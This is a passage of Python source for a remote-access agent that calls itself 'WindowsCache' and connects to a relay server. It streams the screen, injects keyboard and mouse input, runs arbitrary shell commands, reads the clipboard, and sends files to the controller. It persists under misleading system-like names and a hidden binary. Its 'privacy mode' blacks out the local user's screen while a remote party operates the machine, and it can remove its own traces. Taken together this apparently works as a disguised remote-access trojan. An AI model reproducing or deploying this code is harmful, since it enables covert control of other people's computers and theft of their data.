#             _fields_ = [('mi', MOUSEINPUT), ('ki', KEYBDINPUT), ('hi', HARDWAREINPUT)]
#         _anonymous_ = ('_input',)
#         _fields_ = [('type', ctypes.wintypes.DWORD), ('_input', _INPUT)]

#     return INPUT


def _resolve_vk_scan(key):
    if key is None:
        return None, None
    if isinstance(key, int):
        return key & 0xFF, user32.MapVirtualKeyW(key & 0xFF, 0)
    s = str(key)
    if s in VK_MAP:
        vk = VK_MAP[s]
        return vk, user32.MapVirtualKeyW(vk, 0)
    if len(s) == 1:
        vk = user32.VkKeyScanW(ord(s))
        if vk == -1 or vk == 0xFFFF:
            return None, None
        return vk & 0xFF, user32.MapVirtualKeyW(vk & 0xFF, 0)
    low = s.lower()
    if len(low) == 1:
        vk = user32.VkKeyScanW(ord(low))
        if vk == -1 or vk == 0xFFFF:
            return None, None
        return vk & 0xFF, user32.MapVirtualKeyW(vk & 0xFF, 0)
    return None, None


def _send_key_input(key, down=True):
    """Inject a key via SendInput with MAGIC_TAG so privacy hooks ignore it."""
    if platform.system() != 'Windows':
        mapped = KEY_MAP.get(key)
        try:
            if mapped:
                if down:
                    keyboard_controller.press(mapped)
                else:
                    keyboard_controller.release(mapped)
            elif isinstance(key, str) and len(key) == 1:
                if down:
                    keyboard_controller.press(key)
                else:
                    keyboard_controller.release(key)
        except Exception:
            pass
        return

    extra = ctypes.c_ulong(MAGIC_TAG_VALUE)
    extra_ptr = ctypes.pointer(extra)

    # Unicode path FIRST — before any VK lookup.
    # Most reliable for browser typing, handles all printable chars.
    if isinstance(key, str) and len(key) == 1 and ord(key) >= 32 and key not in ('\r', '\n', '\t'):
        inp = KEY_INPUT(type=1)
        inp.ki.wVk = 0
        inp.ki.wScan = ord(key)
        flags = 0x0004  # KEYEVENTF_UNICODE
        if not down:
            flags |= 0x0002
        inp.ki.dwFlags = flags
        inp.ki.dwExtraInfo = extra_ptr
        ctypes.windll.user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(KEY_INPUT))
        return

    # VK path for special keys only (Enter, Backspace, arrows, etc.)
    vk, scan = _resolve_vk_scan(key)

    if vk is None:
        mapped = KEY_MAP.get(key)
        try:
            if mapped:
                if down:
                    keyboard_controller.press(mapped)
                else:
                    keyboard_controller.release(mapped)
            elif isinstance(key, str) and len(key) == 1:
                if down:
                    keyboard_controller.press(key)
                else:
                    keyboard_controller.release(key)
        except Exception:
            pass
        return

    inp = KEY_INPUT(type=1)
    inp.ki.wVk = vk
    inp.ki.wScan = scan or 0
    flags = 0
    if not down:
        flags |= 0x0002
    inp.ki.dwFlags = flags
    inp.ki.dwExtraInfo = extra_ptr
    ctypes.windll.user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(KEY_INPUT))

def _tap_key(key):
    _send_key_input(key, down=True)
    time.sleep(0.008)
    _send_key_input(key, down=False)


def _send_key_combo(keys):
    if not keys:
        return
    for k in keys:
        _send_key_input(k, down=True, force_vk=True)
        time.sleep(0.01)
    time.sleep(0.02)
    for k in reversed(keys):
        _send_key_input(k, down=False, force_vk=True)
        time.sleep(0.008)


def _type_text(text):
    if not text:
        return
    if platform.system() != 'Windows':
        keyboard_controller.type(text)
        return
    for ch in text:
        if ch == '\n':
            _tap_key('Enter')
        elif ch == '\t':
            _tap_key('Tab')
        else:
            _send_key_input(ch, down=True)
            _send_key_input(ch, down=False)
        time.sleep(0.004)



def blank_screen():
    global privacy_monitor_thread, _privacy_hwnd, _privacy_thread

    if env['os'] == 'Linux':
        os.system('xset dpms force off')
        os.system('xset s activate')
        privacy_monitor_thread = threading.Thread(target=monitor_local_input, daemon=True)
        privacy_monitor_thread.start()

    elif env['os'] == 'Windows':
        def create_black_window():
            global _privacy_hwnd
            try:
                hInstance = kernel32.GetModuleHandleW(None)
                className = 'WindowsCachePrivacy'

                WNDPROC = ctypes.WINFUNCTYPE(
                    ctypes.c_ssize_t, wt.HWND, wt.UINT,
                    ctypes.c_ssize_t, ctypes.c_ssize_t
                )

                user32.DefWindowProcW.restype = ctypes.c_ssize_t
                user32.DefWindowProcW.argtypes = [wt.HWND, wt.UINT, ctypes.c_ssize_t, ctypes.c_ssize_t]

                def wnd_proc(hwnd, msg, wParam, lParam):
                    if msg == 0x0002:
                        user32.PostQuitMessage(0)
                        return 0
                    if msg == 0x000F:
                        try:
                            import ctypes
                            class PAINTSTRUCT(ctypes.Structure):
                                _fields_ = [('hdc', ctypes.c_void_p),('fErase',ctypes.c_bool),
                                    ('rcPaint',ctypes.c_int*4),('fRestore',ctypes.c_bool),
                                    ('fIncUpdate',ctypes.c_bool),('rgbReserved',ctypes.c_byte*32)]
                            ps = PAINTSTRUCT()
                            hdc = user32.BeginPaint(hwnd, ctypes.byref(ps))
                            gdi = ctypes.windll.gdi32
                            gdi.PatBlt(hdc, 0, 0, sw, sh, 0x000042)
                            pt = wt.POINT()
                            user32.GetCursorPos(ctypes.byref(pt))
                            brush = gdi.CreateSolidBrush(0x00FFFFFF)
                            old_brush = gdi.SelectObject(hdc, brush)
                            r = 4
                            gdi.Ellipse(hdc, pt.x - r, pt.y - r, pt.x + r, pt.y + r)
                            gdi.SelectObject(hdc, old_brush)
                            gdi.DeleteObject(brush)
                            user32.EndPaint(hwnd, ctypes.byref(ps))
                        except Exception:
                            pass
                        return 0
                    if msg == 0x0200:
                        user32.InvalidateRect(hwnd, None, False)
                        return 0
                    return user32.DefWindowProcW(hwnd, msg, wParam, lParam)

                wnd_proc_c = WNDPROC(wnd_proc)

                class WNDCLASSW(ctypes.Structure):
                    _fields_ = [
                        ('style', wt.UINT), ('lpfnWndProc', WNDPROC),
                        ('cbClsExtra', ctypes.c_int), ('cbWndExtra', ctypes.c_int),
                        ('hInstance', ctypes.c_void_p), ('hIcon', ctypes.c_void_p),
                        ('hCursor', ctypes.c_void_p), ('hbrBackground', ctypes.c_void_p),
                        ('lpszMenuName', wt.LPCWSTR), ('lpszClassName', wt.LPCWSTR),
                    ]

                wndClass = WNDCLASSW()
                wndClass.lpfnWndProc = wnd_proc_c
                wndClass.hInstance = hInstance
                wndClass.hbrBackground = ctypes.windll.gdi32.GetStockObject(4)
                wndClass.lpszClassName = className
                user32.RegisterClassW(ctypes.byref(wndClass))

                sw = user32.GetSystemMetrics(0)
                sh = user32.GetSystemMetrics(1)

                hwnd = user32.CreateWindowExW(
                    0x00000008 | 0x00080000 | 0x00000020,
                    className, '',
                    0x90000000,
                    0, 0, sw, sh,
                    None, None, hInstance, None
                )
                _privacy_hwnd = hwnd
                user32.ShowWindow(hwnd, 1)
                user32.SetWindowPos(hwnd, ctypes.c_void_p(-1), 0, 0, sw, sh, 0x0040)
                user32.SetForegroundWindow(hwnd)
                user32.UpdateWindow(hwnd)
                ctypes.windll.user32.SetLayeredWindowAttributes(hwnd, 0, 255, 0x2)

                WDA_EXCLUDEFROMCAPTURE = 0x00000011
                try:
                    user32.SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE)
                    print('[PRIVACY] Window excluded from capture')
                except Exception as e:
                    print(f'[PRIVACY] SetWindowDisplayAffinity failed: {e}')

                # Message loop with 5-minute timeout
                msg = wt.MSG()
                timeout = 300
                start = time.time()
                while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
                    if time.time() - start > timeout:
                        print('[PRIVACY] Black window timeout exceeded, exiting')
                        break
                    user32.TranslateMessage(ctypes.byref(msg))
                    user32.DispatchMessageW(ctypes.byref(msg))

            except Exception as e:
                print(f'[PRIVACY] Window error: {e}')

        _privacy_thread = threading.Thread(target=create_black_window, daemon=True)
        _privacy_thread.start()
        time.sleep(0.3)
        privacy_monitor_thread = threading.Thread(target=monitor_local_input, daemon=True)
        privacy_monitor_thread.start()


def _send_key_input(key, down=True, force_vk=False):
    """Inject a key via SendInput with MAGIC_TAG so privacy hooks ignore it."""
    if platform.system() != 'Windows':
        mapped = KEY_MAP.get(key)
        try:
            if mapped:
                if down:
                    keyboard_controller.press(mapped)
                else:
                    keyboard_controller.release(mapped)
            elif isinstance(key, str) and len(key) == 1:
                if down:
                    keyboard_controller.press(key)
                else:
                    keyboard_controller.release(key)
        except Exception:
            pass
        return

    extra = ctypes.c_ulong(MAGIC_TAG_VALUE)
    extra_ptr = ctypes.pointer(extra)

    # Unicode path — skip if force_vk is set (used by combos)
    if not force_vk and isinstance(key, str) and len(key) == 1 and ord(key) >= 32 and key not in ('\r', '\n', '\t'):
        inp = KEY_INPUT(type=1)
        inp.ki.wVk = 0
        inp.ki.wScan = ord(key)
        flags = 0x0004  # KEYEVENTF_UNICODE
        if not down:
            flags |= 0x0002
        inp.ki.dwFlags = flags
        inp.ki.dwExtraInfo = extra_ptr
        ctypes.windll.user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(KEY_INPUT))
        return

    # VK path for special keys and forced VK (combos)
    vk, scan = _resolve_vk_scan(key)

    if vk is None:
        mapped = KEY_MAP.get(key)
        try:
            if mapped:
                if down:
                    keyboard_controller.press(mapped)
                else:
                    keyboard_controller.release(mapped)
            elif isinstance(key, str) and len(key) == 1:
                if down:
                    keyboard_controller.press(key)
                else:
                    keyboard_controller.release(key)
        except Exception:
            pass
        return

    inp = KEY_INPUT(type=1)
    inp.ki.wVk = vk
    inp.ki.wScan = scan or 0
    flags = 0
    if not down:
        flags |= 0x0002
    inp.ki.dwFlags = flags
    inp.ki.dwExtraInfo = extra_ptr
    ctypes.windll.user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(KEY_INPUT))

def restore_screen():
    global _privacy_hwnd

    if env['os'] == 'Linux':
        try:
            os.system('xset dpms force on')
            os.system('xset s reset')
        except Exception as e:
            print(f'[PRIVACY] Linux restore error: {e}')

    elif env['os'] == 'Windows':
        try:
            if _privacy_hwnd:
                user32.PostMessageW(_privacy_hwnd, 0x0002, 0, 0)
                _privacy_hwnd = None
        except Exception as e:
            print(f'[PRIVACY] Restore_screen error: {e}')
        try:
            show_cursor()
        except Exception as e:
            print(f'[PRIVACY] Cursor restore error: {e}')


def notify_screen_restored_sync():
    global controller_id_global, main_loop
    if controller_id_global and sio.connected and main_loop:
        asyncio.run_coroutine_threadsafe(
            sio.emit('agent:screen:restored', {'deviceId': device_id, 'controllerId': controller_id_global}),
            main_loop
        )


def privacy_mode_restore():
    global privacy_mode
    privacy_mode = False
    try:
        restore_screen()
    except Exception as e:
        print(f'[PRIVACY] privacy_mode_restore error: {e}')
    try:
        show_cursor()
    except Exception:
        pass
    notify_screen_restored_sync()


def monitor_local_input():
    global privacy_mode

    if env['os'] == 'Windows':
        try:
            mouse_hook = user32.SetWindowsHookExW(14, MOUSE_CB, kernel32.GetModuleHandleW(None), 0)
            key_hook = user32.SetWindowsHookExW(13, KEY_CB, kernel32.GetModuleHandleW(None), 0)
            msg = wt.MSG()
            while privacy_mode:
                if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
                    user32.TranslateMessage(ctypes.byref(msg))
                    user32.DispatchMessageW(ctypes.byref(msg))
                time.sleep(0.01)
            user32.UnhookWindowsHookEx(mouse_hook)
            user32.UnhookWindowsHookEx(key_hook)
        except Exception as e:
            print(f'[PRIVACY] Windows hook error: {e}')

    elif env['os'] == 'Linux':
        try:
            from pynput import mouse as pmouse, keyboard as pkeyboard
            def on_move(x, y, injected=False):
                if not injected and privacy_mode:
                    privacy_mode_restore()
                    return False
            def on_click(x, y, button, pressed, injected=False):
                if not injected and privacy_mode:
                    privacy_mode_restore()
                    return False
            def on_press(key, injected=False):
                if not injected and privacy_mode:
                    privacy_mode_restore()
                    return False
            ml = pmouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_move)
            kl = pkeyboard.Listener(on_press=on_press)
            ml.start(); kl.start()
            while privacy_mode:
                time.sleep(0.1)
            ml.stop(); kl.stop()
        except Exception as e:
            print(f'[PRIVACY] Linux monitor error: {e}')


def format_size(size_bytes):
    if size_bytes < 1024: return f'{size_bytes} B'
    elif size_bytes < 1024*1024: return f'{size_bytes/1024:.1f} KB'
    elif size_bytes < 1024*1024*1024: return f'{size_bytes/(1024*1024):.1f} MB'
    else: return f'{size_bytes/(1024*1024*1024):.1f} GB'


def list_directory(path):
    try:
        path = os.path.expanduser(path)
        if not os.path.isdir(path):
            return {'error': f'Not a directory: {path}'}
        entries = []
        try:
            items = os.listdir(path)
        except PermissionError:
            return {'error': 'Permission denied'}
        for name in sorted(items, key=lambda x: (not os.path.isdir(os.path.join(path, x)), x.lower())):
            full = os.path.join(path, name)
            try:
                stat = os.stat(full)
                is_dir = os.path.isdir(full)
                entries.append({'name': name, 'type': 'folder' if is_dir else 'file',
                    'size': 0 if is_dir else stat.st_size,
                    'sizeStr': '' if is_dir else format_size(stat.st_size),
                    'modified': int(stat.st_mtime), 'path': full})
            except Exception:
                entries.append({'name': name, 'type': 'file', 'size': 0, 'sizeStr': '?', 'modified': 0, 'path': full})
        parent = str(os.path.dirname(path)) if path != os.path.dirname(path) else None
        return {'path': path, 'parent': parent, 'entries': entries}
    except Exception as e:
        return {'error': str(e)}

if WEBRTC_AVAILABLE:
    from aiortc.mediastreams import MediaStreamError

    class ScreenTrack(VideoStreamTrack):
        kind = 'video'

        def __init__(self, monitor_index=1):
            super().__init__()
            self._stopped = False
            self._monitor_index = monitor_index
            # Resolve the monitor geometry once, on whatever thread inits us.
            sct = get_mss()
            monitors = sct.monitors[1:]
            idx = min(max(monitor_index - 1, 0), len(monitors) - 1)
            self.monitor = monitors[idx]
            self.width = self.monitor['width']
            self.height = self.monitor['height']

        def stop_capture(self):
            self._stopped = True

        def _grab_frame(self):
            # Runs entirely on the capture pool: get_mss() resolves to that
            # thread's own instance, so no cross-thread GDI handles.
            sct = get_mss()
            shot = sct.grab(self.monitor)
            frame = np.frombuffer(shot.raw, dtype=np.uint8)
            frame = frame.reshape((shot.height, shot.width, 4))
            frame = np.ascontiguousarray(frame[:, :, 2::-1])  # BGRA -> RGB
            return frame

        async def recv(self):
            if self._stopped:
                raise MediaStreamError

            pts, time_base = await self.next_timestamp()  # this is the pacing
            loop = asyncio.get_running_loop()

            try:
                frame = await loop.run_in_executor(_capture_pool, self._grab_frame)
            except Exception as e:
                if self._stopped:
                    raise MediaStreamError
                log.warning("[WEBRTC] frame grab failed, sending black: %s", e)
                frame = np.zeros((self.height, self.width, 3), dtype=np.uint8)

            video_frame = av.VideoFrame.from_ndarray(frame, format='rgb24')
            video_frame = video_frame.reformat(format='yuv420p')
            video_frame.pts = pts
            video_frame.time_base = time_base
            return video_frame

async def self_uninstall():
        await asyncio.sleep(1)
        try:
            if platform.system() == 'Windows':
                import winreg
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, 'WindowsCache')
                    winreg.CloseKey(key)
                except Exception:
                    pass
                
                install_dir = os.path.join(os.environ.get('APPDATA', ''), 'WindowsCache')
                config_dir = os.path.join(os.path.expanduser('~'), '.wincache')
                temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
                
                vbs_path = os.path.join(temp_dir, 'wc_uninstall.vbs')
                vbs_content = f'''
    WScript.Sleep 2000
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run "taskkill /f /im BridgeLinkAgent.exe >nul 2>&1", 0, False
    WScript.Sleep 1000
    Set fso = CreateObject("Scripting.FileSystemObject")
    On Error Resume Next
    fso.DeleteFolder "{install_dir}", True
    fso.DeleteFolder "{config_dir}", True
    fso.DeleteFile "{vbs_path}", True
    '''
                with open(vbs_path, 'w') as f:
                    f.write(vbs_content)
                
                subprocess.Popen(
                    ['wscript.exe', vbs_path],
                    creationflags=0x00000008 | 0x08000000,
                    close_fds=True,
                    stdin=subprocess.DEVNULL,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            elif platform.system() == 'Linux':
                os.system('systemctl --user stop wincache 2>/dev/null')
                os.system('systemctl --user disable wincache 2>/dev/null')
                service = os.path.join(os.path.expanduser('~'), '.config', 'systemd', 'user', 'wincache.service')
                if os.path.exists(service):
                    os.remove(service)
                installed = os.path.join(os.path.expanduser('~'), '.local', 'bin', '.wincache-agent')
                if os.path.exists(installed):
                    os.remove(installed)
                config_dir_linux = os.path.join(os.path.expanduser('~'), '.wincache')
                if os.path.exists(config_dir_linux):
                    shutil.rmtree(config_dir_linux, ignore_errors=True)
        except Exception as e:
            print(f'[UNINSTALL] Error: {e}')
        finally:
            stop_local_activity_monitor()
            try:
                await sio.disconnect()
            except Exception:
                pass
            sys.exit(0)

    


async def loop_health():
    while True:
        start = time.time()
        await asyncio.sleep(1)
        drift = time.time() - start - 1.0
        if drift > 0.5:
            log.warning("[HEALTH] event loop stalled %.2fs", drift)


sio = socketio.AsyncClient(
    reconnection=True,
    reconnection_attempts=0,
    reconnection_delay=3,
    reconnection_delay_max=30,
)
pc = None
current_track = None


async def monitor_screen_state():
    global privacy_mode, controller_id_global
    prev_privacy = False
    while True:
        await asyncio.sleep(2)
        if not privacy_mode and prev_privacy:
            if controller_id_global:
                await sio.emit('agent:screen:status', {
                    'deviceId': device_id,
                    'controllerId': controller_id_global,
                    'status': 'on'
                })
        prev_privacy = privacy_mode

async def keepalive():
    while True:
        await asyncio.sleep(30)
        try:
            if sio.connected:
                await sio.emit('agent:ping', {'deviceId': device_id})
        except Exception:
            pass
    
async def screenshot_loop():
    log.info("[SCREEN] Starting mss screenshot backbone")
    TARGET_FPS = 8
    MAX_WIDTH = 1280
    JPEG_QUALITY = 40
    min_interval = 1.0 / TARGET_FPS
    fail_streak = 0
    last_digest = None

    def grab_jpeg():
        try:
            sct = get_mss()
            mons = sct.monitors[1:]
            if not mons:
                return None
            idx = min(max(active_monitor_index - 1, 0), len(mons) - 1)
            shot = sct.grab(mons[idx])
            img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
            if img.width > MAX_WIDTH:
                nh = max(1, int(img.height * MAX_WIDTH / img.width))
                img = img.resize((MAX_WIDTH, nh), Image.BILINEAR)
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=JPEG_QUALITY, optimize=False)
            return buf.getvalue(), img.width, img.height
        except Exception:
            close_mss()   # reset THIS thread's handle; next call rebuilds it
            raise

    while True:
        t0 = time.time()
        try:
            if not (sio.connected and controller_id_global and env.get("can_capture")):
                await asyncio.sleep(0.4)
                continue
            # When WebRTC is live, send sparse backup frames; when not, stream full rate.
            webrtc_live = bool(pc is not None)
            local_fps = 1.5 if (WEBRTC_AVAILABLE and webrtc_live) else TARGET_FPS
            min_interval = 1.0 / local_fps

            loop = asyncio.get_running_loop()
            try:
                result = await loop.run_in_executor(_capture_pool, grab_jpeg)
            except Exception as e:
                fail_streak += 1
                log.warning("[SCREEN] grab failed: %s", e)
                await asyncio.sleep(min(5.0, 0.5 * fail_streak))
                continue

            if not result:
                await asyncio.sleep(0.2)
                continue

            fail_streak = 0
            jpeg, w, h = result

            # Skip the send if the frame is identical to the last one —
            # on a mostly-static screen this drops bandwidth to near zero.
            digest = hashlib.md5(jpeg).digest()
            if digest == last_digest:
                await asyncio.sleep(max(0.05, min_interval - (time.time() - t0)))
                continue
            last_digest = digest

            if sio.connected and controller_id_global:
                await sio.emit("agent:screenshot", {
                    "deviceId": device_id,
                    "controllerId": controller_id_global,
                    "image": base64.b64encode(jpeg).decode("ascii"),
                    "width": w,
                    "height": h,
                    "ts": time.time(),
                })

        except Exception as e:
            log.warning("[SCREEN] loop error: %s", e)
            await asyncio.sleep(0.5)

        await asyncio.sleep(max(0.05, min_interval - (time.time() - t0)))


@sio.event
async def connect():
    global pc, current_track
    print('[AGENT] Connected to relay')
    if current_track:
        try:
            current_track.stop_capture()
        except Exception:
            pass
        current_track = None
    if pc:
        try:
            await pc.close()
        except Exception:
            pass
        pc = None

    try:
        await sio.emit('agent:register', {
            'passphrase': config['passphrase'],
            'deviceId': device_id,
            'deviceSecret': device_secret,
            'name': config['device_name'],
            'os': env['os'],
            'canCapture': env['can_capture'],
            'captureMethod': env['capture_method'],
            'fallbackMode': env['fallback_mode'],
            'screenWidth': env['screen_width'],
            'screenHeight': env['screen_height'],
            'sessionType': env['session_type'],
            'monitorCount': env.get('monitor_count', 1),
            # NEW
            'webrtcAvailable': WEBRTC_AVAILABLE,
            'streamMode': 'webrtc' if WEBRTC_AVAILABLE else 'screenshot',
            'agentVersion': CURRENT_VERSION,
            'frozen': bool(getattr(sys, 'frozen', False)),
        })
        print('[AGENT] register sent OK')
    except Exception as e:
        import traceback
        print('[AGENT] REGISTER FAILED:', e)
        traceback.print_exc()

    print(f'[AGENT] WebRTC available: {WEBRTC_AVAILABLE}')
    # Start monitoring local user activity
    start_local_activity_monitor()


@sio.event
async def disconnect():
    global privacy_mode
    print('[AGENT] Disconnected from relay')
    if privacy_mode:
        try:
            restore_screen()
        except Exception:
            pass
        privacy_mode = False
    try:
        show_cursor()
    except Exception:
        pass
    stop_local_activity_monitor()


@sio.on('passphrase:updated')
async def on_passphrase_updated(data):
    config['passphrase'] = data['passphrase']

@sio.on('command')
async def on_command(data):
    global privacy_mode, controller_id_global, active_monitor_index, pc

    # Only set when present — never wipe controller_id to None
    cid = data.get('controllerId')
    if cid:
        controller_id_global = cid

    cmd = data.get('command') or {}
    if not isinstance(cmd, dict):
        return

    cmd_type = cmd.get('type')

    if cmd_type == 'session:start':
        print(f'[SESSION] start controller={controller_id_global}')
        # Tell controller we are screenshot-only (frozen / no WebRTC)
        if not WEBRTC_AVAILABLE and controller_id_global:
            try:
                await sio.emit('agent:screen:mode', {
                    'deviceId': device_id,
                    'controllerId': controller_id_global,
                    'mode': 'screenshot',
                })
                await sio.emit('agent:response', {
                    'controllerId': controller_id_global,
                    'deviceId': device_id,
                    'output': '[FALLBACK] WebRTC unavailable, using screenshot mode',
                    'type': 'screen:fallback',
                })
            except Exception as e:
                print(f'[SESSION] mode notify error: {e}')
        return

    if cmd_type == 'session:end':
        print('[SESSION] end')
        # Keep agent online; only clear active controller for screenshot targeting
        # controller_id_global = None  # uncomment if you want stream to stop on Back
        return

    if cmd_type == 'mouse_move':
        x, y = int(cmd.get('x', 0)), int(cmd.get('y', 0))
        with _mouse_lock:
            _latest_mouse['x'] = x
            _latest_mouse['y'] = y
            _latest_mouse['seq'] += 1
            seq = _latest_mouse['seq']

        def _apply_move(seq=seq):
            with _mouse_lock:
                # drop stale moves — only apply the latest
                if seq != _latest_mouse['seq']:
                    return
                mx, my = _latest_mouse['x'], _latest_mouse['y']
            if env['os'] == 'Windows':
                _send_mouse_input(mx, my, move_only=True)
            else:
                mouse_controller.position = (mx, my)

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(_input_pool, _apply_move)

    elif cmd_type == 'mouse_click':
        btn = mouse.Button.left if cmd.get('button') == 'left' else mouse.Button.right
        if env['os'] == 'Windows':
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(
                _input_pool,
                lambda: _send_mouse_input(
                    cmd['x'], cmd['y'], move_only=False, button=cmd.get('button', 'left')
                ),
            )
        else:
            mouse_controller.position = (cmd['x'], cmd['y'])
            mouse_controller.click(btn)

    elif cmd_type == 'mouse_scroll':
        dx = int(cmd.get('dx', 0))
        dy = int(cmd.get('dy', 0))
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(_input_pool, lambda: _send_scroll(dx, dy))

    elif cmd_type == 'mouse_dblclick':
        btn = mouse.Button.left if cmd.get('button') == 'left' else mouse.Button.right
        if env['os'] == 'Windows':
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(
                None,
                lambda: _send_mouse_input(
                    cmd['x'], cmd['y'], move_only=False, button=cmd.get('button', 'left')
                ),
            )
            await loop.run_in_executor(
                None,
                lambda: _send_mouse_input(
                    cmd['x'], cmd['y'], move_only=False, button=cmd.get('button', 'left')
                ),
            )
        else:
            mouse_controller.position = (cmd['x'], cmd['y'])
            mouse_controller.click(btn, 2)

    elif cmd_type == 'key_press':
        print(f'[KEY] received key={repr(cmd.get("key"))} keys={repr(cmd.get("keys"))}')
        key = cmd.get('key', '')
        keys = cmd.get('keys')
        loop = asyncio.get_running_loop()
        try:
            if keys:
                await loop.run_in_executor(None, lambda: _send_key_combo(list(keys)))
            elif key:
                await loop.run_in_executor(None, lambda k=key: _tap_key(k))
        except Exception as e:
            print(f'[KEY] key_press error: {e} | key={repr(key)}')

    elif cmd_type == 'key_down':
        key = cmd.get('key', '')
        loop = asyncio.get_running_loop()
        try:
            await loop.run_in_executor(None, lambda k=key: _send_key_input(k, True))
        except Exception as e:
            print(f'[KEY] key_down error: {e}')

    elif cmd_type == 'key_up':
        key = cmd.get('key', '')
        loop = asyncio.get_running_loop()
        try:
            await loop.run_in_executor(None, lambda k=key: _send_key_input(k, False))
        except Exception as e:
            print(f'[KEY] key_up error: {e}')

    elif cmd_type == 'key_combo':
        keys = cmd.get('keys') or []
        loop = asyncio.get_running_loop()
        try:
            await loop.run_in_executor(None, lambda: _send_key_combo(list(keys)))
        except Exception as e:
            print(f'[KEY] key_combo error: {e}')

    elif cmd_type == 'type_text':
        text_in = cmd.get('text', '')
        loop = asyncio.get_running_loop()
        try:
            await loop.run_in_executor(None, lambda: _type_text(text_in))
        except Exception as e:
            print(f'[KEY] type_text error: {e}')

    elif cmd_type == 'shell':
        try:
            result = subprocess.run(
                cmd['command'], shell=True, capture_output=True, text=True, timeout=30
            )
            await sio.emit(
                'agent:response',
                {
                    'controllerId': data.get('controllerId'),
                    'deviceId': device_id,
                    'output': result.stdout + result.stderr,
                },
            )
        except Exception as e:
            await sio.emit(
                'agent:response',
                {
                    'controllerId': data.get('controllerId'),
                    'deviceId': device_id,
                    'output': str(e),
                },
            )

    elif cmd_type == 'privacy:on':
        privacy_mode = True
        blank_screen()
        hide_cursor()
        await sio.emit(
            'agent:screen:status',
            {
                'deviceId': device_id,
                'controllerId': controller_id_global,
                'status': 'off',
            },
        )

    elif cmd_type == 'privacy:off':
        privacy_mode = False
        try:
            restore_screen()
        except Exception as e:
            print(f'[PRIVACY] Restore error: {e}')
        try:
            show_cursor()
        except Exception as e:
            print(f'[PRIVACY] Cursor error: {e}')
        await sio.emit(
            'agent:screen:status',
            {
                'deviceId': device_id,
                'controllerId': controller_id_global,
                'status': 'on',
            },
        )

    elif cmd_type == 'cursor:hide':
        hide_cursor()

    elif cmd_type == 'cursor:show':
        show_cursor()

    elif cmd_type == 'agent:uninstall':
        asyncio.create_task(self_uninstall())

    elif cmd_type == 'chat:message':
        show_notification('WindowsCache Message', cmd.get('message', ''))

    elif cmd_type == 'clipboard:set':
        set_clipboard(cmd.get('text', ''))

    elif cmd_type == 'clipboard:get':
        text = get_clipboard()
        await sio.emit(
            'agent:response',
            {
                'controllerId': data.get('controllerId'),
                'deviceId': device_id,
                'type': 'clipboard:content',
                'text': text,
            },
        )

    elif cmd_type == 'monitor:switch':
        monitor_idx = cmd.get('index', 1)
        active_monitor_index = monitor_idx
        if pc:
            try:
                await pc.close()
            except Exception:
                pass
            pc = None
        await sio.emit(
            'agent:response',
            {
                'controllerId': data.get('controllerId'),
                'deviceId': device_id,
                'type': 'monitor:switched',
                'index': monitor_idx,
            },
        )

    elif cmd_type == 'monitor:list':
        monitors = []
        try:
            sct = get_mss()
            for i, m in enumerate(sct.monitors[1:], 1):
                monitors.append(
                    {
                        'index': i,
                        'width': m['width'],
                        'height': m['height'],
                        'left': m['left'],
                        'top': m['top'],
                    }
                )
        except Exception as e:
            print(f'[MONITOR] list error: {e}')
        await sio.emit(
            'agent:response',
            {
                'controllerId': data.get('controllerId'),
                'deviceId': device_id,
                'type': 'monitor:list',
                'monitors': monitors,
            },
        )

    elif cmd_type == 'fs:list':
        path = cmd.get('path', os.path.expanduser('~'))
        result = list_directory(path)
        await sio.emit(
            'agent:response',
            {
                'controllerId': data.get('controllerId'),
                'deviceId': device_id,
                'type': 'fs:list',
                'requestId': cmd.get('requestId'),
                **result,
            },
        )

    elif cmd_type == 'file:send':
        try:
            chunk_index = cmd.get('chunkIndex', 0)
            total_chunks = cmd.get('totalChunks', 1)
            file_name = cmd.get('fileName', 'received_file')
            save_dir = os.path.join(os.path.expanduser('~'), 'Desktop')
            if not os.path.exists(save_dir):
                save_dir = os.path.expanduser('~')
            save_path = os.path.join(save_dir, file_name)
            with open(save_path, 'ab' if chunk_index > 0 else 'wb') as f:
                f.write(base64.b64decode(cmd.get('data', '')))
            if chunk_index == total_chunks - 1:
                await sio.emit(
                    'agent:response',
                    {
                        'controllerId': data.get('controllerId'),
                        'deviceId': device_id,
                        'type': 'file:received',
                        'path': save_path,
                        'fileName': file_name,
                    },
                )
        except Exception as e:
            await sio.emit(
                'agent:response',
                {
                    'controllerId': data.get('controllerId'),
                    'deviceId': device_id,
                    'type': 'file:error',
                    'error': str(e),
                },
            )

    elif cmd_type == 'file:request':
        try:
            file_path = os.path.expanduser(cmd.get('path', ''))
            if not os.path.exists(file_path):
                await sio.emit(
                    'agent:response',
                    {
                        'controllerId': data.get('controllerId'),
                        'deviceId': device_id,
                        'type': 'file:error',
                        'error': f'File not found: {file_path}',
                    },
                )
                return
            file_name = os.path.basename(file_path)
            file_size = os.path.getsize(file_path)
            chunk_size = 65536
            total_chunks = (file_size + chunk_size - 1) // chunk_size
            with open(file_path, 'rb') as f:
                for i in range(total_chunks):
                    chunk = f.read(chunk_size)
                    await sio.emit(
                        'agent:response',
                        {
                            'controllerId': data.get('controllerId'),
                            'deviceId': device_id,
                            'type': 'file:chunk',
                            'fileName': file_name,
                            'chunkIndex': i,
                            'totalChunks': total_chunks,
                            'data': base64.b64encode(chunk).decode('utf-8'),
                            'fileSize': file_size,
                        },
                    )
                    await asyncio.sleep(0.01)
        except Exception as e:
            await sio.emit(
